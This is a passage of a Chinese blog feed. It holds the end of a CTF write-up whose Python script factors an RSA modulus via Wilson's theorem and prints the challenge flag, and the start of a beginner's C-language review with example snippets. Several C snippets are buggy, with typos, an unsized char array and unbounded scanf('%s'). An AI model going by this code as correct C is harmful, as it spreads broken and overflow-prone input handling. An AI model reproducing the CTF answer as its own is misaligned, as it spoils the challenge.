punctuation">)</span><span class="token punctuation">,</span>pA<span class="token punctuation">)</span> <span class="token operator">%</span> pA</pre></td></tr><tr><td data-num="33"></td><td><pre>p <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>qA</pre></td></tr><tr><td data-num="35"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	q <span class="token operator">=</span> q <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>qA<span class="token punctuation">)</span> <span class="token operator">%</span> qA</pre></td></tr><tr><td data-num="39"></td><td><pre>q <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>r <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">iroot</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span><span class="token function">mpz</span><span class="token punctuation">(</span>n<span class="token comment">//(p*q**2)),3)</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'p ='</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'q ='</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'r ='</span><span class="token punctuation">,</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>q<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">long_to_bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>N0w_U_knOw_how_70_u5E_W1lS0n'5_Th30r3m<span class="token operator">~</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpYWhpYWNoYW5nL2FydGljbGUvZGV0YWlscy8xMDg4MDAyMTA=">大佬 1 的 WP</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5lL2FydGljbGUvZGV0YWlscy8xMDg4MzMzNzM=">大佬 2 的 WP</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言复习总结</title>
    <url>/article/7625eb58.html</url>
    <content><![CDATA[<p>系统性的复习一下 C，毕竟万物始于 C 嘛！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111192714626.png" alt="image-20220111192714626" /></p>
<h2 id="c语言简介"><a class="anchor" href="#c语言简介">#</a> C 语言简介</h2>
<p>高效性、可移植性、强大的功能与灵活性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111192844644.png" alt="image-20220111192844644" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  <span class="token comment">// 标准的输入输出文件</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 主函数 main</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 为定义名为 num 的变量赋值</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"i am 21r000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用 printf 函数打印</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    reurn <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 返回值</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>C 语言错误一般分为：</p>
<ul>
<li>语法错误</li>
<li>语义错误</li>
</ul>
<h2 id="数据与c"><a class="anchor" href="#数据与c">#</a> 数据与 C</h2>
<h3 id="整数型"><a class="anchor" href="#整数型">#</a> 整数型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">int</span> num<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// 类型名 变量名</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> num1<span class="token punctuation">,</span>num2<span class="token punctuation">,</span>num3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 类型名 变量名 变量名 变量名</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 赋值</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">//scanf 输入函数 scanf ("% d",&amp;num);</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">//scanf_s 输入函数 scanf_s ("% d",&amp;num,10); 需声名大小</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">//% d 相当于告诉程序，接收的参数是一个 int 类型</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">//&amp;num 告诉程序，接收的数据，储存到 num 里面</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// \n 换行</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">//int 类型占 32 位</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">//short int 16 位 short 不长于 int 类型</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//long int 32 位 long 不短于 int 类型</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">//long long int 64 位</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">//unsiged 无符号 int 类型</span></pre></td></tr></table></figure><h3 id="字符型"><a class="anchor" href="#字符型">#</a> 字符型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 理论上占 8 位</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//Ascii 码 0-127</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//Unicode</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//16 位甚至 32 位</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> name <span class="token operator">=</span> <span class="token char">'A'</span><span class="token punctuation">;</span><span class="token comment">// 定义变量</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">//scanf ("% C",&amp;name); 读入字符</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span>；</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// \n 换行</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// \r 回车</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// \a 警报</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111194834591.png" alt="image-20220111194834591" /></p>
<h3 id="浮点型"><a class="anchor" href="#浮点型">#</a> 浮点型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">//float 单精度浮点型 32 位</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//double 双精度浮点型 64 位</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">// 其实浮点寄存器是不能精确存储的</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">float</span> num <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">double</span> num1 <span class="token operator">=</span> <span class="token number">12E-5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f,%f"</span><span class="token punctuation">,</span>num<span class="token punctuation">,</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111195337335.png" alt="image-20220111195337335" /></p>
<h3 id="_bool类型"><a class="anchor" href="#_bool类型">#</a> _Bool 类型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">_Bool</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//0 代表 false</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//1 代表 true</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符串的格式化输入输出"><a class="anchor" href="#字符串的格式化输入输出">#</a> 字符串的格式化输入输出</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PI</span> <span class="token expression"><span class="token number">3.14</span></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//define 给 PI 赋值</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 字符串变量不需要在作为 scanf 参数的时候加 & amp; 符号</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">//sizeof 返回的是数组实际占用的内存数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">//strlen 计算字符的有效字符数，遇到 NULL 结束，NULL = 00</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111200451835.png" alt="image-20220111200451835" /></p>
<h2 id="运算符-表达式和语句"><a class="anchor" href="#运算符-表达式和语句">#</a> 运算符、表达式和语句</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">//1. 顺序结构</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//2. 循环结构</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">// 选择结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No！"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>C 语言的除法运算中，如果是整形，就会被截尾；如果是浮点型，就会保留小数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 求模运算符 %</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//10 - 3 * 3 求的是余数</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111201625377.png" alt="image-20220111201625377" /></p>
<h2 id="流程控制语句-循环"><a class="anchor" href="#流程控制语句-循环">#</a> 流程控制语句 - 循环</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//while</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//true = 1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">//false = 0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">// 死循环，没有推出条件</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        flag <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">//do while 循环无论如何都会进入代码块执行一次</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">do</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>flag <span class="token operator">>=</span> <span class="token number">11</span><span class="token comment">/* condition */</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//1. 首先执行代码块</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">//2. 进行表达式判断</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">//3. 如果表达式返回值是 1，那么进入代码块继续执行，否则退出</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">//for 循环</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token comment">//1. 循环计数器赋初值</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">//2. 判断是否符合表达式</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">//3. 执行代码块</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment">//4. 自增，判断是否符合表达式</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment">//5. 执行代码块</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="流程控制语句-分支和跳转"><a class="anchor" href="#流程控制语句-分支和跳转">#</a> 流程控制语句 - 分支和跳转</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span><span class="token comment">// 字符判断函数</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//if</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> num<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag = num"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag != num"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">char</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    a <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读取一个字符</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">isalpha</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断参数是否为字符</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">putchar</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出一个字符</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//isalpha 判断参数是否为字符</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">//isalnum 判断参数是否为字母或数字</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">//isblank 